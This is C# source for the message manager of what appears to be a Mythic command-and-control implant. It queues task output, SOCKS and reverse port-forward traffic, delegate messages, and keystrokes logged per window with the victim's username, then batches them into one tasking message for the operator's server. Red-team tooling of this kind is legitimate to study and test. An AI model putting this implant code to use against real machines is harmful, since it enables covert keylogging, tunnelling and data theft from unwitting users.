using Agent.Interfaces;
using Agent.Models;
using System.Collections.Concurrent;
using System.Text;
using System.Text.Json;

namespace Agent.Managers
{
    public class MessageManager : IMessageManager
    {
        private sealed class BufferedTaskResponse
        {
            public string TaskId { get; set; } = string.Empty;
            public List<string> OutputChunks { get; } = new List<string>();
            public string? Status { get; set; }
            public bool Completed { get; set; }
            public string? FileId { get; set; }
            public Dictionary<string, List<string>> ProcessChunks { get; } = new Dictionary<string, List<string>>();

            public BufferedTaskResponse Clone()
            {
                var clone = new BufferedTaskResponse
                {
                    TaskId = TaskId,
                    Status = Status,
                    Completed = Completed,
                    FileId = FileId,
                };
                clone.OutputChunks.AddRange(OutputChunks);
                foreach ((string key, List<string> chunks) in ProcessChunks)
                    clone.ProcessChunks[key] = new List<string>(chunks);
                return clone;
            }

            public TaskResponse ToTaskResponse()
            {
                return new TaskResponse()
                {
                    task_id = TaskId,
                    user_output = OutputChunks.Count == 0 ? null : string.Concat(OutputChunks),
                    status = Status,
                    completed = Completed,
                    file_id = FileId,
                    process_response = ProcessChunks.Count == 0
                        ? null
                        : ProcessChunks.ToDictionary(item => item.Key, item => string.Concat(item.Value)),
                };
            }
        }

        private sealed class OutboundBuffer
        {
            public Dictionary<string, BufferedTaskResponse> TaskResponses { get; } = new Dictionary<string, BufferedTaskResponse>();
            public List<BufferedSerializedResponse> SerializedResponses { get; } = new List<BufferedSerializedResponse>();
            public List<ServerDatagram> Socks { get; } = new List<ServerDatagram>();
            public List<ServerDatagram> ReversePortForwards { get; } = new List<ServerDatagram>();
            public List<InteractMessage> Interactive { get; } = new List<InteractMessage>();
            public List<DelegateMessage> Delegates { get; } = new List<DelegateMessage>();
            public string KeylogTaskId { get; set; } = string.Empty;
            public Dictionary<string, Keylogs> Keylogs { get; } = new Dictionary<string, Keylogs>();
            public long DatagramBytes { get; set; }
            public long Bytes { get; set; }
            public int Count { get; set; }

            public int DatagramCount => Socks.Count + ReversePortForwards.Count;
            public bool HasResponses => TaskResponses.Count > 0 || SerializedResponses.Count > 0 ||
                Socks.Count > 0 || ReversePortForwards.Count > 0 || Interactive.Count > 0 ||
                Delegates.Count > 0 || Keylogs.Count > 0;
        }

        private sealed class BufferedSerializedResponse
        {
            public string Response { get; }
            public string? TaskId { get; }
            public bool Completed { get; }

            public BufferedSerializedResponse(string response, string? taskId, bool completed)
            {
                Response = response;
                TaskId = taskId;
                Completed = completed;
            }
        }

        private sealed class InFlightBatch
        {
            public OutboundBuffer Buffer { get; }
            public string Message { get; }

            public InFlightBatch(OutboundBuffer buffer, string message)
            {
                Buffer = buffer;
                Message = message;
            }
        }

        private readonly object outboundLock = new object();
        private readonly SemaphoreSlim deliveryLock = new SemaphoreSlim(1, 1);
        private readonly ConcurrentDictionary<string, ServerJob> activeJobs = new ConcurrentDictionary<string, ServerJob>();
        private ILogger logger { get; set; }
        private readonly long maxPendingDatagramBytes;
        private readonly int maxPendingDatagramCount;
        private readonly long maxPendingOutboundBytes;
        private readonly int maxPendingOutboundCount;
        private OutboundBuffer pending = new OutboundBuffer();
        private InFlightBatch? inFlight;
        private long retainedDatagramBytes;
        private int retainedDatagramCount;
        private long retainedOutboundBytes;
        private int retainedOutboundCount;

        public MessageManager(
            ILogger logger,
            long maxPendingDatagramBytes = 4 * 1024 * 1024,
            int maxPendingDatagramCount = 4096,
            long maxPendingOutboundBytes = 16 * 1024 * 1024,
            int maxPendingOutboundCount = 16384)
        {
            this.logger = logger;
            this.maxPendingDatagramBytes = maxPendingDatagramBytes;
            this.maxPendingDatagramCount = maxPendingDatagramCount;
            this.maxPendingOutboundBytes = maxPendingOutboundBytes;
            this.maxPendingOutboundCount = maxPendingOutboundCount;
        }

        private bool TryReserve(OutboundBuffer buffer, long bytes, int count = 1)
        {
            if (bytes < 0 || count < 0 ||
                bytes > maxPendingOutboundBytes - retainedOutboundBytes ||
                count > maxPendingOutboundCount - retainedOutboundCount)
                return false;

            buffer.Bytes += bytes;
            buffer.Count += count;
            retainedOutboundBytes += bytes;
            retainedOutboundCount += count;
            return true;
        }

        private bool TryReserveOrLog(OutboundBuffer buffer, long bytes, int count = 1)
        {
            if (TryReserve(buffer, bytes, count)) return true;
            logger.Log("Outbound message capacity is exhausted; the message was not queued.");
            return false;
        }

        private void Release(OutboundBuffer buffer, long bytes)
        {
            buffer.Bytes -= bytes;
            retainedOutboundBytes -= bytes;
        }

        private static int Utf8Bytes(string? value)
        {
            return value is null ? 0 : Encoding.UTF8.GetByteCount(value);
        }

        private static int BufferedTaskResponseBytes(BufferedTaskResponse response) =>
            Utf8Bytes(response.TaskId) + response.OutputChunks.Sum(Utf8Bytes) + Utf8Bytes(response.Status) +
            Utf8Bytes(response.FileId) + response.ProcessChunks.Sum(item =>
                Utf8Bytes(item.Key) + item.Value.Sum(Utf8Bytes));

        private static BufferedTaskResponse Buffer(TaskResponse response)
        {
            var buffered = new BufferedTaskResponse
            {
                TaskId = response.task_id,
                Status = response.status,
                Completed = response.completed,
                FileId = response.file_id,
            };
            if (!string.IsNullOrEmpty(response.user_output)) buffered.OutputChunks.Add(response.user_output);
            if (response.process_response is not null)
            {
                foreach ((string key, string value) in response.process_response)
                    buffered.ProcessChunks[key] = new List<string> { value };
            }
            return buffered;
        }

        private static void Merge(
            BufferedTaskResponse existing,
            BufferedTaskResponse update,
            bool separateOutputChunks)
        {
            if (update.OutputChunks.Count > 0)
            {
                if (separateOutputChunks && existing.OutputChunks.Count > 0)
                    existing.OutputChunks.Add(Environment.NewLine);
                existing.OutputChunks.AddRange(update.OutputChunks);
            }
            existing.Completed |= update.Completed;
            if (!string.IsNullOrEmpty(update.Status)) existing.Status = update.Status;
            if (!string.IsNullOrEmpty(update.FileId)) existing.FileId = update.FileId;
            foreach ((string key, List<string> updateChunks) in update.ProcessChunks)
            {
                if (!existing.ProcessChunks.TryGetValue(key, out List<string>? chunks))
                    existing.ProcessChunks[key] = chunks = new List<string>();
                else if (chunks.Count > 0)
                    chunks.Add(Environment.NewLine);
                chunks.AddRange(updateChunks);
            }
        }

        private void EnqueueTaskResponse(TaskResponse response, bool separateOutputChunks)
        {
            BufferedTaskResponse update = Buffer(response);
            if (!pending.TaskResponses.TryGetValue(response.task_id, out BufferedTaskResponse? existing))
            {
                if (!TryReserveOrLog(pending, BufferedTaskResponseBytes(update))) return;
                pending.TaskResponses.Add(response.task_id, update);
                return;
            }

            BufferedTaskResponse merged = existing.Clone();
            Merge(merged, update, separateOutputChunks);
            long sizeChange = BufferedTaskResponseBytes(merged) - BufferedTaskResponseBytes(existing);
            if (sizeChange > 0 && !TryReserveOrLog(pending, sizeChange, count: 0)) return;
            else if (sizeChange < 0) Release(pending, -sizeChange);
            pending.TaskResponses[response.task_id] = merged;
        }

        public void AddKeystroke(string window_title, string task_id, string key)
        {
            lock (outboundLock)
            {
                if (!pending.Keylogs.TryGetValue(window_title, out Keylogs? keylog))
                {
                    if (!TryReserveOrLog(pending, Utf8Bytes(window_title) + Utf8Bytes(task_id) +
                        Utf8Bytes(Environment.UserName) + Utf8Bytes(key))) return;
                    if (string.IsNullOrEmpty(pending.KeylogTaskId)) pending.KeylogTaskId = task_id;
                    keylog = new Keylogs
                    {
                        window_title = window_title,
                        user = Environment.UserName,
                        builder = new StringBuilder(),
                    };
                    pending.Keylogs.Add(window_title, keylog);
                }
                else
                {
                    if (!TryReserveOrLog(pending, Utf8Bytes(key), count: 0)) return;
                }
                keylog.builder.Append(key);
            }
        }

        public void AddDelegateMessage(DelegateMessage message)
        {
            lock (outboundLock)
            {
                if (!TryReserveOrLog(pending, Utf8Bytes(message.message) + Utf8Bytes(message.c2_profile) +
                    Utf8Bytes(message.uuid) + Utf8Bytes(message.mythic_uuid) + Utf8Bytes(message.new_uuid))) return;
                pending.Delegates.Add(new DelegateMessage
                {
                    message = message.message,
                    c2_profile = message.c2_profile,
                    uuid = message.uuid,
                    mythic_uuid = message.mythic_uuid,
                    new_uuid = message.new_uuid,
                });
            }
        }

        public void AddInteractMessage(InteractMessage message)
        {
            lock (outboundLock)
            {
                if (!TryReserveOrLog(pending,
                    Utf8Bytes(message.task_id) + Utf8Bytes(message.data) + sizeof(int))) return;
                pending.Interactive.Add(new InteractMessage
                {
                    task_id = message.task_id,
                    data = message.data,
                    message_type = message.message_type,
                });
            }
        }

        public void AddDatagram(DatagramSource source, ServerDatagram datagram)
        {
            if (!TryAddDatagram(source, datagram))
                logger.Log("Outbound datagram was not queued because capacity is exhausted or its source is unsupported.");
        }

        public bool TryAddDatagram(DatagramSource source, ServerDatagram datagram)
        {
            lock (outboundLock)
            {
                List<ServerDatagram>? destination = source switch
                {
                    DatagramSource.Socks5 => pending.Socks,
                    DatagramSource.RPortFwd => pending.ReversePortForwards,
                    _ => null,
                };
                if (destination is null) return false;

                if (datagram.bdata is null)
                {
                    logger.Log("Outbound datagram was not queued because it has no data.");
                    return false;
                }
                int bytes = datagram.bdata.Length;
                if (bytes > maxPendingDatagramBytes - retainedDatagramBytes ||
                    retainedDatagramCount >= maxPendingDatagramCount ||
                    !TryReserve(pending, bytes))
                    return false;

                destination.Add(new ServerDatagram(datagram.server_id, datagram.bdata.ToArray(), datagram.exit));
                pending.DatagramBytes += bytes;
                retainedDatagramBytes += bytes;
                retainedDatagramCount++;
                return true;
            }
        }

        public void AddTaskResponse(ITaskResponse response)
        {
            lock (outboundLock)
            {
                switch (response)
                {
                    case TaskResponse taskResponse when taskResponse.GetType() == typeof(TaskResponse):
                        EnqueueTaskResponse(taskResponse, separateOutputChunks: true);
                        break;
                    case TaskResponse derivedTaskResponse:
                        EnqueueSerializedResponse(
                            derivedTaskResponse.ToJson(),
                            derivedTaskResponse.task_id,
                            derivedTaskResponse.completed);
                        break;
                    default:
                        logger.Log($"Unsupported response type was not queued: {response.GetType().Name}.");
                        break;
                }
            }
        }

        public void AddTaskResponse(string response)
        {
            AddTaskResponse(response, null, completed: false);
        }

        public void AddTaskResponse(string response, string? taskId, bool completed)
        {
            lock (outboundLock) EnqueueSerializedResponse(response, taskId, completed);
        }

        private void EnqueueSerializedResponse(string response, string? taskId, bool completed)
        {
            if (string.IsNullOrWhiteSpace(response))
            {
                logger.Log("Serialized task response was not queued because it is empty.");
                return;
            }
            try
            {
                using JsonDocument _ = JsonDocument.Parse(response);
            }
            catch (JsonException)
            {
                logger.Log("Serialized task response was not queued because it is not valid JSON.");
                return;
            }

            if (!TryReserveOrLog(pending, Utf8Bytes(response))) return;
            pending.SerializedResponses.Add(new BufferedSerializedResponse(response, taskId, completed));
        }

        public void Write(string? output, string task_id, bool completed, string status)
        {
            lock (outboundLock)
            {
                EnqueueTaskResponse(new TaskResponse
                {
                    user_output = output,
                    completed = completed,
                    status = status,
                    task_id = task_id,
                }, separateOutputChunks: false);
            }
        }

        public void Write(string? output, string task_id, bool completed)
        {
            Write(output, task_id, completed, string.Empty);
        }

        public void WriteLine(string? output, string task_id, bool completed, string status)
        {
            Write(output + Environment.NewLine, task_id, completed, status);
        }

        public void WriteLine(string? output, string task_id, bool completed)
        {
            WriteLine(output, task_id, completed, string.Empty);
        }

        public void AddJob(ServerJob job)
        {
            this.activeJobs.TryAdd(job.task.id, job);
        }

        public bool TryGetJob(string task_id, out ServerJob? job)
        {
            return this.activeJobs.TryGetValue(task_id, out job);
        }

        public Dictionary<string, ServerJob> GetJobs()
        {
            return this.activeJobs.ToDictionary(item => item.Key, item => item.Value, this.activeJobs.Comparer);
        }

        public void CompleteJob(string task_id)
        {
            this.activeJobs.TryRemove(task_id, out _);
        }

        public async Task<T> DeliverAsync<T>(Func<string, Task<T>> deliver, Func<T, bool> accepted)
        {
            await deliveryLock.WaitAsync();
            try
            {
                InFlightBatch batch;
                lock (outboundLock)
                {
                    if (inFlight is null)
                    {
                        OutboundBuffer leased = pending;
                        inFlight = new InFlightBatch(leased, Serialize(leased));
                        pending = new OutboundBuffer();
                    }
                    batch = inFlight;
                }

                T result = await deliver(batch.Message);
                if (!accepted(result)) return result;

                lock (outboundLock)
                {
                    foreach (BufferedTaskResponse response in batch.Buffer.TaskResponses.Values)
                    {
                        if (response.Completed) activeJobs.TryRemove(response.TaskId, out _);
                    }
                    foreach (BufferedSerializedResponse response in batch.Buffer.SerializedResponses)
                    {
                        if (response.Completed && response.TaskId is not null)
                            activeJobs.TryRemove(response.TaskId, out _);
                    }
                    retainedDatagramBytes -= batch.Buffer.DatagramBytes;
                    retainedDatagramCount -= batch.Buffer.DatagramCount;
                    retainedOutboundBytes -= batch.Buffer.Bytes;
                    retainedOutboundCount -= batch.Buffer.Count;
                    inFlight = null;
                }
                return result;
            }
            finally
            {
                deliveryLock.Release();
            }
        }

        private static string Serialize(OutboundBuffer buffer)
        {
            List<string> responses = buffer.SerializedResponses
                .Select(response => response.Response)
                .ToList();
            responses.AddRange(buffer.TaskResponses.Values.Select(response => response.ToTaskResponse().ToJson()));
            if (!string.IsNullOrEmpty(buffer.KeylogTaskId) && buffer.Keylogs.Count > 0)
            {
                var keyPressResponse = new KeyPressTaskResponse
                {
                    task_id = buffer.KeylogTaskId,
                    keylogs = buffer.Keylogs.Values.ToList(),
                };
                keyPressResponse.Prepare();
                responses.Add(keyPressResponse.ToJson());
            }

            return JsonSerializer.Serialize(new GetTasking
            {
                action = "get_tasking",
                tasking_size = -1,
                delegates = buffer.Delegates,
                socks = buffer.Socks,
                responses = responses,
                rpfwd = buffer.ReversePortForwards,
                interactive = buffer.Interactive,
            }, GetTaskingJsonContext.Default.GetTasking);
        }

        public bool HasResponses()
        {
            lock (outboundLock) return inFlight is not null || pending.HasResponses;
        }
    }
}
